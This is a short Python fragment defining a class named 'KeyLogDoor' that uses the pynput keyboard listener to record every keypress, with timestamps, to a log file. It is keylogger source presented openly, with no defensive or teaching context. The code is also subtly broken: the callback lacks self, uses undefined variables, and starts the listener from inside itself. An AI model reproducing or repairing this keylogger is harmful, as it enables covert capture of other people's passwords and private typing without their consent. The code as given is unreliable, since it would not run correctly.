class KeyLogDoor(object):
    from pynput.keyboard import Key, Listener
    import logging

    def __init__(self, log_dir, name_file):
      self.log_dir = log_dir
      self.name_file = name_file

    def on_press(key):
        logging.basicConfig(filename = (log_dir + '{}.txt'.format(name_file)), level=logging.DEBUG, format='%(asctime)s: %(message)s')
        logging.info(str(key))
        with Listener(on_press=on_press) as listener:
            listener.join()